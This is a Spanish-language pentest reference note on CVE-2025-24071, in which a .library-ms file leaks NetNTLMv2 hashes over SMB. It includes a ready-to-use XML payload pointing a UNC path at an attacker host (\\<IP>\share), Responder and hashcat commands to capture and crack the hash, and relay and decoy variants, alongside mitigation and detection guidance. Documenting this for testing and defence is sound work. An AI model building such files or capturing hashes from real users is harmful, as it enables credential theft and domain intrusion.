---
topic: .library-ms — fuga de NetNTLMv2 al abrir un recurso
tags: [windows, ntlm, library-ms, smb, cve-2025-24071, credential-leak]
---

# .library-ms — fuga de NetNTLMv2 al abrir un recurso

[🌐 English](library-ms-ntlm-leak.en.md) | **Español**

## Concepto

Windows Explorer procesa archivos `.library-ms` y `.searchConnector-ms` para definir ubicaciones de búsqueda. Si el XML apunta a una ruta UNC, Explorer intenta autenticarse contra ese servidor SMB y envía el hash NetNTLMv2 del usuario que abrió el archivo. CVE-2025-24071 describe el caso en el que un archivo dentro de un ZIP se procesa automáticamente al extraerlo.

## Cuándo aplica

- Un usuario o servicio abre un ZIP o un directorio con un `.library-ms`.
- El host permite SMB saliente.
- El recurso apunta a un servidor controlado por el atacante.
- La cuenta tiene privilegios útiles en el dominio.

## Procedimiento

1. Crear el XML con una ruta UNC al listener.
2. Incluirlo en un ZIP que la víctima vaya a extraer o abrir.
3. Iniciar Responder o `ntlmrelayx` para capturar la autenticación.
4. Crackear el NetNTLMv2 con `hashcat -m 5600`.
5. Reutilizar la contraseña o relayar el hash si es posible.

## Comandos

```xml
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation><url>\\<IP>\share</url></simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

```bash
responder -I tun0
hashcat -m 5600 hash.txt rockyou.txt
```

## Variantes

- `.searchConnector-ms` con la misma estructura.
- Ruta `\\<IP>\share\icon.ico` para forzar la carga del icono.
- Relay SMB a otro host si la firma no es obligatoria.
- Combinarlo con un documento señuelo.

## Limitaciones

- SMB saliente debe estar permitido.
- La firma SMB puede impedir el relay, pero no la captura.
- El hash debe ser crackeable o relayable.
- El usuario debe abrir o extraer el archivo.

## Mitigación

- Bloquear SMB saliente en el perímetro y en los endpoints.
- Aplicar reglas de WDAC/AppLocker a `.library-ms`.
- Deshabilitar la generación automática de miniaturas para rutas remotas.
- Usar credenciales de baja privilegio en cuentas de servicio.

## Detección

- Conexiones SMB salientes a IPs no inventariadas.
- Autenticaciones NTLM desde estaciones a servidores externos.
- Archivos `.library-ms` dentro de ZIP o correo.
- Eventos 4624/4776 con origen inesperado.

## Referencias

- [NVD — CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071)
- [Microsoft — Security Update Guide](https://msrc.microsoft.com/update-guide/)
- [0xdf — NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
